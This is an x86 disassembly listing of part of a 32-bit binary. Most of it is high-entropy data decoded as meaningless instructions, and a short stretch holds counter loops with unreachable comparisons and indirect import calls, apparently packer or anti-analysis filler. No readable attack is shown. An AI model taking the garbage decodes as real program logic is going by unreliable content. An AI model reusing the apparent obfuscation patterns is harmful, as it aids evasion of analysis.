  418edf:	pop    esp
  418ee0:	stos   BYTE PTR es:[edi],al
  418ee1:	out    0x95,al
  418ee3:	push   ebx
  418ee4:	inc    DWORD PTR [ecx+0x7907e5a0]
  418eea:	sub    bh,bl
  418eec:	mov    dh,0xc7
  418eee:	mov    ch,bh
  418ef0:	sub    eax,0xaa48fe2
  418ef5:	and    al,0x7b
  418ef7:	jp     0x418eeb
  418ef9:	push   ebx
  418efa:	dec    ebp
  418efb:	sub    BYTE PTR [ebx-0x48],bh
  418efe:	xlat   BYTE PTR ds:[ebx]
  418eff:	xchg   ebx,eax
  418f00:	mov    eax,0x859363e3
  418f05:	pusha  
  418f06:	jae    0x418f37
  418f08:	cmp    dl,BYTE PTR [edi+0x34]
  418f0b:	out    dx,al
  418f0c:	clc    
  418f0d:	pop    ecx
  418f0e:	outs   dx,BYTE PTR ds:[esi]
  418f0f:	(bad)  [ebx+0x7ebb8a4e]
  418f15:	int    0x7d
  418f17:	sar    DWORD PTR [ebx-0x66],1
  418f1a:	mov    edx,0x14b7ccaf
  418f1f:	(bad)  
  418f20:	mov    ebx,0xa84a6d6e
  418f25:	mov    eax,ds:0x5dc24a99
  418f2a:	cmp    BYTE PTR [edi+0x17],cl
  418f2d:	mov    bl,0x39
  418f2f:	adc    BYTE PTR ds:0x613c356b,bh
  418f35:	aas    
  418f36:	rcl    DWORD PTR [ebx+0x7c8c4a52],cl
  418f3c:	inc    edi
  418f3d:	and    edi,DWORD PTR [eax-0x27]
  418f40:	xchg   bh,ch
  418f42:	cmp    al,0x8f
  418f44:	call   0x21b83822
  418f49:	mov    ch,0xae
  418f4b:	shl    BYTE PTR [edi],1
  418f4d:	stos   BYTE PTR es:[edi],al
  418f4e:	jmp    0x418f49
  418f50:	fmul   QWORD PTR [edi+eax*2]
  418f53:	cmp    DWORD PTR [edi+0x5d],ebp
  418f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f57:	sbb    al,0xeb
  418f59:	loopne 0x418ef2
  418f5b:	sub    eax,0x103ad177
  418f60:	aam    0x5f
  418f62:	sub    ebp,DWORD PTR [ecx+0x35]
  418f65:	(bad)  
  418f66:	jmp    0x418f76
  418f68:	cmp    DWORD PTR [edi+0xd],esi
  418f6b:	fistp  DWORD PTR [edx]
  418f6d:	mov    ds:0x2ba69d17,eax
  418f72:	std    
  418f73:	inc    edx
  418f74:	xchg   esp,eax
  418f75:	daa    
  418f76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f77:	ins    BYTE PTR es:[edi],dx
  418f78:	pop    ebx
  418f79:	mov    ecx,0x7491f8e2
  418f7e:	adc    ebp,esp
  418f80:	scas   al,BYTE PTR es:[edi]
  418f81:	scas   al,BYTE PTR es:[edi]
  418f82:	ja     0x418fd4
  418f84:	aas    
  418f85:	loopne 0x418f69
  418f87:	ror    DWORD PTR [edi-0x3a],0x61
  418f8b:	icebp  
  418f8c:	pop    eax
  418f8d:	and    eax,0x7ea11c0f
  418f92:	and    al,0x88
  418f94:	pop    esi
  418f95:	addr16 add al,0xc0
  418f98:	jb     0x418fa3
  418f9a:	in     eax,0xc3
  418f9c:	jmp    0x418f28
  418f9e:	jge    0x418fb1
  418fa0:	push   0x1790c12c
  418fa5:	mov    ah,0x58
  418fa7:	jns    0x418f9b
  418fa9:	lods   al,BYTE PTR ds:[esi]
  418faa:	outs   dx,BYTE PTR ds:[esi]
  418fab:	adc    ebx,DWORD PTR ds:0x8be8a7df
  418fb1:	adc    dl,BYTE PTR [ebx]
  418fb3:	nop
  418fb4:	dec    edi
  418fb5:	pop    ds
  418fb6:	sub    DWORD PTR [edx-0x22],esp
  418fb9:	inc    edi
  418fba:	cmp    bl,ah
  418fbc:	dec    edi
  418fbd:	mov    cl,0xf0
  418fbf:	and    edx,ebp
  418fc1:	and    al,0xb3
  418fc3:	addr16 iret 
  418fc5:	and    BYTE PTR [eax+0x28],dh
  418fc8:	aas    
  418fc9:	in     eax,0xc0
  418fcb:	xchg   edx,eax
  418fcc:	jbe    0x418f72
  418fce:	xlat   BYTE PTR ds:[ebx]
  418fcf:	sahf   
  418fd0:	mov    ebx,0xd373d894
  418fd5:	scas   al,BYTE PTR es:[edi]
  418fd6:	jnp    0x418f9b
  418fd8:	fadd   st(4),st
  418fda:	mov    al,ds:0x3ac93787
  418fdf:	push   cs
  418fe0:	shl    bl,cl
  418fe2:	push   ds
  418fe3:	ins    BYTE PTR es:[edi],dx
  418fe4:	dec    edi
  418fe5:	pop    ds
  418fe6:	xor    al,0x5e
  418fe8:	xchg   esi,eax
  418fe9:	(bad)  
  418fea:	mov    DWORD PTR [ecx],esi
  418fec:	mov    bl,0x53
  418fee:	test   DWORD PTR ss:[ebp-0x3669fb54],eax
  418ff5:	fmul   DWORD PTR [eax-0x17c3158e]
  418ffb:	mov    edi,0xd1953ddb
  419000:	or     BYTE PTR [edx-0x12e69469],al
  419006:	mov    dl,0x85
  419008:	pop    ebx
  419009:	in     al,0x3
  41900b:	xchg   ecx,eax
  41900c:	mov    ds:0xaeb8a1c7,eax
  419011:	jns    0x419054
  419013:	fucom  st(2)
  419015:	mov    WORD PTR [eax-0x1dac1024],ds
  41901b:	ins    BYTE PTR es:[edi],dx
  41901c:	jns    0x418fe7
  41901e:	xchg   edi,eax
  41901f:	jle    0x41901a
  419021:	mov    esi,0x7bd3bad
  419026:	nop
  419027:	cmp    edi,eax
  419029:	gs inc ecx
  41902b:	jg     0x419074
  41902d:	mov    eax,0x83414260
  419032:	add    bl,bh
  419034:	fld    TBYTE PTR [ebp+0x6e]
  419037:	xchg   edx,eax
  419038:	sbb    BYTE PTR [ebx+0x6acdf1a2],al
  41903e:	xor    esi,ebp
  419040:	xor    dh,BYTE PTR [ebx+ebx*1-0xb]
  419044:	ficom  DWORD PTR [ecx+0x39122c51]
  41904a:	or     eax,0x67128a49
  41904f:	jg     0x41908b
  419051:	push   ds
  419052:	push   eax
  419053:	xchg   esi,eax
  419054:	adc    ch,cl
  419056:	scas   al,BYTE PTR es:[edi]
  419057:	hlt    
  419058:	cmp    al,0xbd
  41905a:	jg     0x418ff3
  41905c:	adc    eax,ebx
  41905e:	xchg   esp,edx
  419060:	loope  0x419069
  419062:	loope  0x4190ca
  419064:	sub    eax,0x81addf7a
  419069:	add    edi,DWORD PTR [esi]
  41906b:	mov    edx,DWORD PTR [esi]
  41906d:	sub    al,0x28
  41906f:	repz fcmovnbe st,st(3)
  419072:	sbb    DWORD PTR [ebx],esp
  419074:	ret    
  419075:	pusha  
  419076:	push   cs
  419077:	out    dx,al
  419078:	pop    eax
  419079:	adc    DWORD PTR [ecx],esi
  41907b:	neg    DWORD PTR [ebx-0x401cbb2b]
  419081:	dec    esp
  419082:	ret    
  419083:	lock (bad) 
  419085:	push   cs
  419086:	and    al,0x6a
  419088:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419089:	int    0x3e
  41908b:	mov    BYTE PTR [eax-0x80],bl
  41908e:	repz out dx,al
  419090:	pop    ebx
  419091:	dec    eax
  419092:	mov    DWORD PTR [esi],edx
  419094:	mov    ecx,0x92183a90
  419099:	mov    ds:0xcc25db1a,eax
  41909e:	inc    esp
  41909f:	sahf   
  4190a0:	xchg   esi,eax
  4190a1:	and    al,0x85
  4190a3:	cmp    eax,0x759ef696
  4190a8:	mov    WORD PTR [esi+0x7c299992],ds
  4190ae:	out    dx,eax
  4190af:	sub    DWORD PTR [edi-0x76176c78],esp
  4190b5:	mov    eax,0x7c2ae82a
  4190ba:	dec    ebx
  4190bb:	cs out dx,eax
  4190bd:	fs aam 0x33
  4190c0:	pop    esp
  4190c1:	dec    ecx
  4190c2:	and    eax,0x9cb80a8f
  4190c7:	sti    
  4190c8:	sbb    DWORD PTR [eax-0x363d3ace],ecx
  4190ce:	mov    BYTE PTR [esi],dl
  4190d0:	cs ret 
  4190d2:	ds ja  0x419086
  4190d5:	(bad)  
  4190d6:	lods   eax,DWORD PTR ds:[esi]
  4190d7:	gs shr dl,cl
  4190da:	sub    al,0x1
  4190dc:	inc    edi
  4190dd:	rcl    DWORD PTR [esi-0x5f],cl
  4190e0:	or     ebp,DWORD PTR [esi]
  4190e2:	iret   
  4190e3:	iret   
  4190e4:	push   es
  4190e5:	aam    0xc3
  4190e7:	repz shl BYTE PTR [ebp-0x62f9316a],0xc1
  4190ef:	ficomp DWORD PTR [ebx]
  4190f1:	arpl   WORD PTR [edx],cx
  4190f3:	mov    esp,0xa6ad0c69
  4190f8:	mov    dl,0x57
  4190fa:	std    
  4190fb:	adc    esp,DWORD PTR [ecx+0x72]
  4190fe:	cmp    eax,0xda0bfe80
  419103:	xchg   esp,eax
  419104:	mov    bh,0x38
  419106:	inc    eax
  419107:	inc    eax
  419108:	add    esi,DWORD PTR [edi-0x4]
  41910b:	cmp    BYTE PTR [edi],ch
  41910d:	lods   al,BYTE PTR ds:[esi]
  41910e:	add    DWORD PTR [edx-0x77],ebx
  419111:	and    BYTE PTR ds:0x829e1159,dh
  419117:	loopne 0x4190ad
  419119:	rol    DWORD PTR ds:0x95aa8e68,1
  41911f:	xor    DWORD PTR [esp],edx
  419122:	pop    eax
  419123:	inc    esp
  419124:	push   ebp
  419125:	repz jp 0x419192
  419128:	rol    eax,1
  41912a:	xor    DWORD PTR [edi-0x1b34177f],ecx
  419130:	fcom   QWORD PTR [esi]
  419133:	int3   
  419134:	arpl   WORD PTR [ebx+ebx*1+0x38],cx
  419138:	add    edx,esi
  41913a:	mov    cl,dh
  41913c:	cdq    
  41913d:	mov    bl,0xdd
  41913f:	int3   
  419140:	pop    ds
  419141:	jns    0x4190ca
  419143:	mov    esp,0x30231713
  419148:	sub    bh,bl
  41914a:	mov    ah,BYTE PTR [esi+ecx*2]
  41914d:	mov    esp,0x1f895a57
  419152:	leave  
  419153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419154:	xor    BYTE PTR [edx+0x49d9a99],0xb2
  41915b:	sub    ebp,DWORD PTR [eax-0x2f]
  41915e:	fdivr  QWORD PTR [eax-0x52]
  419161:	jnp    0x4191c6
  419163:	inc    esp
  419164:	fs lahf 
  419166:	imul   dl
  419168:	int3   
  419169:	mov    eax,0xb8256087
  41916e:	mov    DWORD PTR es:[edx+esi*1],esp
  419172:	sbb    al,0x7e
  419174:	adc    DWORD PTR [eax+0x2f],esi
  419177:	xor    ebx,DWORD PTR [edi-0x5f0b1844]
  41917d:	jno    0x419176
  41917f:	gs cld 
  419181:	in     al,dx
  419182:	test   BYTE PTR [ebp-0x5e4e1526],ch
  419188:	xor    DWORD PTR [edi+edi*8-0x30],0xffffffe9
  41918d:	add    eax,DWORD PTR [eax]
  41918f:	add    BYTE PTR [eax],al
  419191:	mov    eax,DWORD PTR [ebp+0x10]
  419194:	leave  
  419195:	ret    0xc
  419198:	push   ebp
  419199:	mov    ebp,esp
  41919b:	sub    esp,0x30
  41919e:	jmp    0x4193d3
  4191a3:	rcl    edx,cl
  4191a5:	ret    0xc13e
  4191a8:	into   
  4191a9:	rcl    ecx,cl
  4191ab:	daa    
  4191ac:	jle    0x419228
  4191ae:	mov    ss,WORD PTR [edx+0x67]
  4191b1:	inc    esi
  4191b2:	aaa    
  4191b3:	or     ch,al
  4191b5:	jg     0x41922f
  4191b7:	adc    BYTE PTR [esi+0x78],bh
  4191ba:	js     0x419143
  4191bc:	jns    0x4191aa
  4191be:	ins    BYTE PTR es:[edi],dx
  4191bf:	jo     0x419206
  4191c1:	add    cl,BYTE PTR ds:0x439c28ba
  4191c7:	lgdtd  [eax+0xd72f49d]
  4191ce:	fnstenv [esi-0x7583fcae]
  4191d4:	and    al,BYTE PTR [edi-0x66]
  4191d7:	sbb    BYTE PTR [eax+0x0],bl
  4191da:	jne    0x41920b
  4191dc:	jmp    0x6c1b1c30
  4191e1:	pop    ecx
  4191e2:	(bad)  
  4191e3:	ins    BYTE PTR es:[edi],dx
  4191e4:	push   eax
  4191e5:	outs   dx,BYTE PTR ds:[esi]
  4191e6:	fcom   QWORD PTR [eax+0xd]
  4191e9:	test   BYTE PTR [edi],dh
  4191eb:	add    ch,BYTE PTR [eax*8+0x5459bf6d]
  4191f2:	cs stos DWORD PTR es:[edi],eax
  4191f4:	int    0x15
  4191f6:	mov    esi,edx
  4191f8:	or     BYTE PTR [ecx],0xaa
  4191fb:	in     eax,0x90
  4191fd:	retf   0x29bb
  419200:	(bad)  
  419202:	xchg   edx,eax
  419203:	add    BYTE PTR [ecx+0x61587b4f],bh
  419209:	jmp    esp
  41920b:	out    dx,eax
  41920c:	fisub  WORD PTR [esi+0x1b41f227]
  419212:	xor    eax,0xba8de23f
  419217:	push   ebp
  419218:	dec    edx
  419219:	or     DWORD PTR [ebx+0x5a822722],ebx
  41921f:	mov    cl,0x47
  419221:	adc    DWORD PTR ds:0xc71f337c,ecx
  419227:	push   edi
  419228:	jnp    0x419227
  41922a:	and    al,0x30
  41922c:	jns    0x419208
  41922e:	cld    
  41922f:	icebp  
  419230:	mov    dl,0x21
  419232:	aam    0x51
  419234:	and    al,0x10
  419236:	pop    ebp
  419237:	shl    BYTE PTR ds:0xae401da,0x5b
  41923e:	nop
  41923f:	imul   eax,esp,0x30b597e7
  419245:	mov    esp,0x57d59b6
  41924a:	and    al,0x46
  41924c:	adc    ecx,0x546887b7
  419252:	cmp    DWORD PTR [ecx+0x6b68d0d2],esi
  419258:	paddd  mm6,mm6
  41925b:	call   FWORD PTR ds:0x88bf8c07
  419261:	inc    ebx
  419262:	iret   
  419263:	jnp    0x4192ab
  419265:	dec    ebp
  419266:	pop    ecx
  419267:	dec    esp
  419268:	mov    bl,0x2e
  41926a:	sar    DWORD PTR gs:[edi-0xc],cl
  41926e:	inc    edi
  41926f:	daa    
  419270:	add    BYTE PTR [ecx+ebp*1],bh
  419273:	cli    
  419274:	mov    al,0xbd
  419276:	mov    esp,0x60f70351
  41927b:	imul   esi,DWORD PTR [edi],0xcf617fd2
  419281:	and    DWORD PTR [esi-0x38],ecx
  419284:	xor    DWORD PTR [esi+ebx*4],ebx
  419287:	repnz in eax,0xca
  41928a:	stc    
  41928b:	lock mov ch,0x51
  41928e:	mov    esi,0xaa953406
  419293:	test   BYTE PTR [esi],0xe7
  419296:	cwde   
  419297:	push   esp
  419298:	inc    esi
  419299:	out    dx,al
  41929a:	add    al,0xc2
  41929c:	mov    ah,0x75
  41929e:	loopne 0x419298
  4192a0:	mov    dl,0x20
  4192a2:	nop
  4192a3:	retf   
  4192a4:	and    al,0x54
  4192a6:	test   DWORD PTR ds:0x7969a5db,ecx
  4192ac:	inc    esp
  4192ad:	jns    0x4192d5
  4192af:	cld    
  4192b0:	aad    0x7
  4192b2:	mov    dh,0xc7
  4192b4:	adc    eax,0xc5f2dd88
  4192b9:	out    dx,al
  4192ba:	popa   
  4192bb:	push   edi
  4192bc:	mov    dl,0xbe
  4192be:	jne    0x41926c
  4192c0:	xor    DWORD PTR [ecx-0xe5f5ada],eax
  4192c6:	push   ds
  4192c7:	xchg   edx,eax
  4192c8:	pop    es
  4192c9:	push   edi
  4192ca:	lock or eax,0x5f4c4cc7
  4192d0:	loope  0x419275
  4192d2:	jae    0x419284
  4192d4:	popa   
  4192d5:	(bad)  
  4192d6:	cli    
  4192d7:	mov    ecx,0xcf69556f
  4192dc:	fwait
  4192dd:	jbe    0x419268
  4192df:	mov    DWORD PTR [ebx],edi
  4192e1:	add    DWORD PTR [ebp-0x359030ce],0xd724b266
  4192eb:	pusha  
  4192ec:	mov    al,0x9d
  4192ee:	cld    
  4192ef:	pop    ss
  4192f0:	stos   DWORD PTR es:[edi],eax
  4192f1:	sbb    BYTE PTR [esi],cl
  4192f3:	mov    ebx,0x3cc92d97
  4192f8:	xchg   BYTE PTR [esi+edx*8],bl
  4192fb:	dec    eax
  4192fc:	adc    BYTE PTR [esi+eax*2+0x46e8cd4d],0x95
  419304:	xor    cl,BYTE PTR [ecx-0x5c]
  419307:	stc    
  419308:	xchg   ecx,eax
  419309:	fidivr WORD PTR [ecx-0x61]
  41930c:	push   0xffffffcc
  41930e:	sub    al,0x88
  419310:	cld    
  419311:	inc    esi
  419312:	pop    ss
  419313:	pop    ss
  419314:	stos   BYTE PTR es:[edi],al
  419315:	popf   
  419316:	gs js  0x41937c
  419319:	mov    eax,0x9a005dc0
  41931e:	(bad)  
  41931f:	(bad)  
  419320:	mov    ecx,0x69227d3e
  419325:	mov    dl,0xc8
  419327:	iret   
  419328:	mov    ds:0x9a5b1ed2,al
  41932d:	inc    ebx
  41932e:	lds    edx,FWORD PTR [esi-0x36]
  419331:	sub    DWORD PTR [ebx+0x726a2d04],edi
  419337:	cmp    DWORD PTR [esi+0x242de78a],esi
  41933d:	mov    ebx,0x63cd3599
  419342:	ins    BYTE PTR es:[edi],dx
  419343:	and    al,0x5a
  419345:	xlat   BYTE PTR ds:[ebx]
  419346:	sbb    eax,0x983bdedb
  41934b:	xor    eax,0x4b8737b2
  419350:	sub    al,0x52
  419352:	(bad)  
  419353:	push   ebp
  419354:	lahf   
  419355:	test   eax,0x9c1addf
  41935a:	mov    es,ebx
  41935c:	out    dx,eax
  41935d:	test   eax,0x94972829
  419362:	(bad)  
  419363:	push   esp
  419364:	outs   dx,DWORD PTR ds:[esi]
  419365:	loope  0x4193b0
  419367:	ds xchg edi,eax
  419369:	push   esp
  41936a:	icebp  
  41936b:	test   ah,cl
  41936d:	jne    0x419323
  41936f:	push   ebp
  419370:	stos   DWORD PTR es:[edi],eax
  419371:	(bad)  
  419372:	push   esp
  419373:	fcom   st(5)
  419375:	inc    esp
  419376:	dec    esi
  419377:	(bad)  
  419378:	ja     0x419312
  41937a:	cld    
  41937b:	neg    DWORD PTR [si+0x79]
  41937f:	xor    eax,edi
  419381:	cmp    BYTE PTR [ebp+0x44],0xb9
  419385:	dec    ecx
  419386:	cmc    
  419387:	and    bh,bl
  419389:	int3   
  41938a:	xchg   ecx,eax
  41938b:	call   0xc1fd2256
  419390:	cdq    
  419391:	imul   esi,esp,0x80bd6f92
  419397:	inc    edi
  419398:	jmp    0x10b1:0x1212cf03
  41939f:	pop    ds
  4193a0:	inc    ecx
  4193a1:	in     eax,0xb4
  4193a3:	push   edi
  4193a4:	add    DWORD PTR [edi-0x65],esi
  4193a7:	cdq    
  4193a8:	push   0xe235cc80
  4193ad:	fs inc ebx
  4193af:	jle    0x4193ed
  4193b1:	scas   al,BYTE PTR es:[edi]
  4193b2:	imul   edi,DWORD PTR [edx],0x50
  4193b5:	push   edx
  4193b6:	dec    esp
  4193b7:	(bad)  
  4193b8:	pop    ds
  4193b9:	sar    eax,0x58
  4193bc:	xchg   ebx,eax
  4193bd:	pushf  
  4193be:	mov    edi,cs
  4193c0:	pop    ebx
  4193c1:	jnp    0x4193d9
  4193c3:	or     eax,0xd66125ac
  4193c8:	(bad)  
  4193c9:	imul   edi,eax,0x7d71a66c
  4193cf:	or     al,0x13
  4193d1:	cwde   
  4193d2:	mov    cl,0xc7
  4193d4:	inc    ebp
  4193d5:	cld    
  4193d6:	cmp    BYTE PTR [ebp+0x2581f89c],al
  4193dc:	jge    0x419386
  4193de:	inc    edx
  4193df:	add    BYTE PTR [eax],al
  4193e1:	add    BYTE PTR [eax],al
  4193e3:	add    BYTE PTR [ebx],dh
  4193e5:	leave  
  4193e6:	add    ecx,DWORD PTR ds:0x42a87d
  4193ec:	inc    ecx
  4193ed:	mov    DWORD PTR ds:0x42a87d,ecx
  4193f3:	cmp    DWORD PTR ds:0x42a87d,0x24
  4193fa:	jne    0x41940b
  419400:	push   0x4f45
  419405:	call   DWORD PTR ds:0x41d278
  41940b:	cmp    DWORD PTR ds:0x42a87d,0x1b
  419412:	jb     0x4193e4
  419418:	and    DWORD PTR ds:0x42a801,0x0
  419422:	jmp    0x419434
  419427:	mov    ecx,DWORD PTR ds:0x42a801
  41942d:	inc    ecx
  41942e:	mov    DWORD PTR ds:0x42a801,ecx
  419434:	cmp    DWORD PTR ds:0x42a801,0x1d
  41943b:	jae    0x419470
  419441:	cmp    DWORD PTR ds:0x42a801,0x1e
  419448:	jne    0x419461
  41944e:	push   0x42a98f
  419453:	push   DWORD PTR [ebp-0x20]
  419456:	push   0x1
  419458:	push   DWORD PTR [ebp-0xc]
  41945b:	call   DWORD PTR ds:0x41d118
  419461:	jmp    0x419427
  419466:	adc    DWORD PTR ds:0x42a7b1,0x7c2
  419470:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  419477:	and    DWORD PTR ds:0x42a80d,0x0
  419481:	mov    ecx,DWORD PTR ds:0x42a80d
  419487:	inc    ecx
  419488:	mov    DWORD PTR ds:0x42a80d,ecx
  41948e:	cmp    DWORD PTR ds:0x42a80d,0x25
  419495:	jne    0x4194a6
  41949b:	push   0x42aa48
  4194a0:	call   DWORD PTR ds:0x41d27c
  4194a6:	cmp    DWORD PTR ds:0x42a80d,0x18
  4194ad:	jb     0x419481
  4194b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4194b6:	mov    eax,ds:0x42a805
  4194bb:	and    DWORD PTR ds:0x42a775,eax
  4194c1:	push   ebx
  4194c2:	add    ebx,ebx
  4194c4:	mov    eax,0x7510850
  4194c9:	and    DWORD PTR ds:0x42a76d,ecx
  4194cf:	xor    ecx,eax
  4194d1:	movzx  ebx,BYTE PTR ds:0x42a779
  4194d8:	adc    DWORD PTR ds:0x42a871,ebx
  4194de:	mov    ebx,0x327298
  4194e3:	adc    DWORD PTR ds:0x42a761,0x50ad
  4194ed:	add    ecx,ebx
  4194ef:	inc    DWORD PTR ds:0x42a87d
  4194f5:	mov    DWORD PTR [ebp-0x1c],ecx
  4194f8:	mov    ecx,DWORD PTR [ebp+0x14]
  4194fb:	push   esi
  4194fc:	mov    DWORD PTR ds:0x42a7f5,0x238f
  419506:	push   edi
  419507:	test   ecx,ecx
  419509:	mov    DWORD PTR ds:0x42a839,0x1f7e
  419513:	je     0x419758
  419519:	jmp    0x41974e
  41951e:	retf   0xd03c
  419521:	(bad)
  419524:	fld    st(3)
  419526:	scas   eax,DWORD PTR es:[edi]
  419527:	inc    eax
  419528:	adc    DWORD PTR [esi+0x6a],eax
  41952b:	loop   0x419541
  41952d:	cmp    eax,0x787fcb20
  419532:	adc    BYTE PTR [esi+0x78],bh
  419535:	js     0x419532
  419537:	ret    0xaf6d
  41953a:	das    
  41953b:	fwait
  41953c:	cmp    bh,BYTE PTR [ebx]
  41953e:	push   esi
  41953f:	lahf   
  419540:	arpl   WORD PTR [eax-0x39],si
  419543:	jge    0x419553
  419545:	loope  0x419558
  419547:	daa    
  419548:	inc    edi
  419549:	inc    ebx
  41954a:	mov    al,ds:0x5e600e89
  41954f:	mov    bl,0x5
  419551:	cmp    al,0xc2
  419553:	xchg   DWORD PTR [ebp-0x53],edi
  419556:	jmp    0x9cbafa19
  41955b:	push   ebp
  41955c:	fsub   DWORD PTR [ebp-0x21]
  41955f:	(bad)  
  419560:	test   al,0x85
  419562:	iret   
  419563:	adc    ch,al
  419565:	nop
  419566:	dec    esp
  419567:	or     BYTE PTR [ecx-0x74],bl
  41956a:	and    DWORD PTR [edx],ebx
  41956c:	inc    ebx
  41956d:	jl     0x41956e
  41956f:	cdq    
  419570:	sar    BYTE PTR [esi],0x32
  419573:	out    0x45,al
  419575:	add    al,ch
  419577:	sahf   
  419578:	cmc    
  419579:	push   edx
  41957a:	sti    
  41957b:	in     al,dx
  41957c:	loopne 0x419527
  41957e:	fiadd  DWORD PTR [ecx+0x7cd90164]
  419584:	ja     0x4195bf
  419586:	xchg   DWORD PTR [ecx-0x1d1da035],ebp
  41958c:	jp     0x4195a9
  41958e:	or     DWORD PTR [edx-0x2],eax
  419591:	mov    ebx,DWORD PTR [ebx+0xc]
  419594:	add    al,0xac
  419596:	inc    ebx
  419597:	sbb    BYTE PTR [eax-0x2a2015a8],bl
  41959d:	jecxz  0x4195a7
  41959f:	ins    BYTE PTR es:[edi],dx
  4195a0:	inc    ebp
  4195a1:	xor    al,0x77
  4195a3:	jle    0x419573
  4195a5:	inc    esp
  4195a6:	jecxz  0x419595
  4195a8:	add    edx,esp
  4195aa:	mov    dl,0xcc
  4195ac:	out    0x41,al
  4195ae:	sub    cl,BYTE PTR [eax]
  4195b0:	mov    ds:0x5f92c6c2,eax
  4195b5:	pop    es
  4195b6:	sti    
  4195b7:	(bad)  
  4195b8:	pop    edx
  4195b9:	rcr    edi,cl
  4195bb:	leave  
  4195bc:	cld    
  4195bd:	inc    edi
  4195be:	xor    edx,0x72
  4195c1:	inc    edi
  4195c2:	(bad)  
  4195c4:	mov    bl,0x66
  4195c6:	movntps XMMWORD PTR [edi+0x61527645],xmm6
  4195cd:	cmp    esp,DWORD PTR [eax+0xf]
  4195d0:	and    al,0xc3
  4195d2:	popa   
  4195d3:	or     al,0x40
  4195d5:	adc    edi,eax
  4195d7:	push   esp
  4195d8:	xchg   esp,eax
  4195d9:	cli    
  4195da:	dec    edx
  4195db:	scas   al,BYTE PTR es:[edi]
  4195dc:	sub    al,bl
  4195de:	push   ebx
  4195df:	mov    ds:0x25c489ca,al
  4195e4:	jbe    0x4195ea
  4195e6:	jb     0x4195aa
  4195e8:	add    DWORD PTR [ebx],ebx
  4195ea:	(bad)  
  4195eb:	pop    eax
  4195ec:	bound  ebp,QWORD PTR [ecx+0x5d]
  4195ef:	mov    edx,0x53bc6bac
  4195f4:	cmp    BYTE PTR [esi+0x789e9c8b],bl
  4195fa:	outs   dx,DWORD PTR ds:[esi]
  4195fb:	mov    bh,0x68
  4195fd:	aam    0x82
  4195ff:	xor    DWORD PTR [ebp+0x7c],0xb
  419603:	jmp    0xafe01d90
  419608:	mov    al,ds:0x48e7a7ae
  41960d:	xchg   edi,eax
  41960e:	dec    esp
  41960f:	push   ecx
  419610:	xor    bl,BYTE PTR [esi+edi*8+0x1b52bb84]
  419617:	fs inc esp
  419619:	cld    
  41961a:	(bad)  
  41961b:	shr    DWORD PTR [esi+eax*1-0x1222f21d],1
  419622:	push   ecx
  419623:	fbstp  TBYTE PTR [eax]
  419625:	sub    dh,dl
  419627:	call   0x6b66fb71
  41962c:	pop    ebx
  41962d:	push   eax
  41962e:	bound  esp,QWORD PTR [edi+0x19]
  419631:	lea    edi,[edx]
  419633:	out    dx,al
  419634:	iret   
  419635:	mov    DWORD PTR [esi+0x6d992b65],edx
  41963b:	push   edx
  41963c:	xor    ecx,DWORD PTR [eax-0x2af44755]
  419642:	mov    ecx,0x3a509c69
  419647:	icebp  
  419648:	mov    eax,ds:0x9f15b1bf
  41964d:	(bad)  
  41964e:	dec    esi
  41964f:	into   
  419650:	pop    ss
  419651:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419652:	dec    esi
  419653:	adc    BYTE PTR [edx-0x54909e40],bl
  419659:	mov    edx,0x5e520f7
  41965e:	sub    ah,dh
  419660:	fisttp QWORD PTR [esi+eax*1+0x61]
  419664:	sub    bl,BYTE PTR [edx-0x9]
  419667:	in     eax,dx
  419668:	lods   eax,DWORD PTR ds:[esi]
  419669:	(bad)  
  41966a:	outs   dx,BYTE PTR ds:[esi]
  41966b:	or     eax,0x86cfe2cb
  419670:	outs   dx,DWORD PTR ds:[esi]
  419671:	(bad)  
  419672:	or     BYTE PTR [ebp+0x22],dh
  419675:	vmaxpd xmm5,xmm5,XMMWORD PTR [eiz*2-0x2b97eb4]
  41967e:	push   ecx
  41967f:	pop    ecx
  419680:	sub    DWORD PTR [edi+0x1b],edi
  419683:	dec    ebx
  419684:	repz in eax,dx
  419686:	jnp    0x419649
  419688:	stos   DWORD PTR es:[edi],eax
  419689:	jle    0x419684
  41968b:	leave  
  41968c:	mov    esp,0x4c6e80cb
  419691:	in     al,dx
  419692:	out    dx,al
  419693:	add    edi,DWORD PTR [ebp+0x402a638a]
  419699:	adc    BYTE PTR [ebp-0x965a1c4],ch
  41969f:	scas   eax,DWORD PTR es:[edi]
  4196a0:	(bad)  
  4196a1:	sahf   
  4196a2:	cld    
  4196a3:	mov    dl,0xa6
  4196a5:	popa   
  4196a6:	xchg   ebx,eax
  4196a7:	ficomp DWORD PTR [esi+0x23]
  4196aa:	sub    al,0xb7
  4196ac:	cmc    
  4196ad:	out    dx,al
  4196ae:	cmp    esi,DWORD PTR [eax-0x34]
  4196b1:	in     al,0xaf
  4196b3:	aaa    
  4196b4:	ins    DWORD PTR es:[edi],dx
  4196b5:	loopne 0x419735
  4196b7:	push   esi
  4196b8:	es inc esp
  4196ba:	fisub  DWORD PTR [eax+0x735d3237]
  4196c0:	ret    
  4196c1:	and    DWORD PTR [edx],esp
  4196c3:	or     al,0xb4
  4196c5:	adc    al,0xc
  4196c7:	test   BYTE PTR [eax],dl
  4196c9:	jmp    0x419667
  4196cb:	mov    ds:0x970a71b6,eax
  4196d0:	stos   DWORD PTR es:[edi],eax
  4196d1:	push   ebx
  4196d2:	sbb    BYTE PTR [ebx],0x2e
  4196d5:	mov    edi,0xb7c68132
  4196da:	pop    ebx
  4196db:	repz and bh,BYTE PTR [esi+ecx*1+0x20]
  4196e0:	push   dx
  4196e2:	jmp    0x84be:0xcddb0171
  4196e9:	cmp    edi,DWORD PTR [esi-0x1a]
  4196ec:	jno    0x41970a
  4196ee:	sub    esi,DWORD PTR [eax+0x2927fdab]
  4196f4:	dec    ebp
  4196f5:	inc    ebx
  4196f6:	sti    
  4196f7:	pop    eax
  4196f8:	daa    
  4196f9:	fneni(8087 only) 
  4196fb:	push   edi
  4196fc:	test   DWORD PTR [edi],edx
  4196fe:	test   eax,0xb04d8d1d
  419703:	push   es
  419704:	cmp    BYTE PTR [ebp+ecx*4-0x5c],dh
  419708:	inc    edi
  419709:	call   0x5b8c7a0b
  41970e:	mov    ds:0xaaeb3db7,al
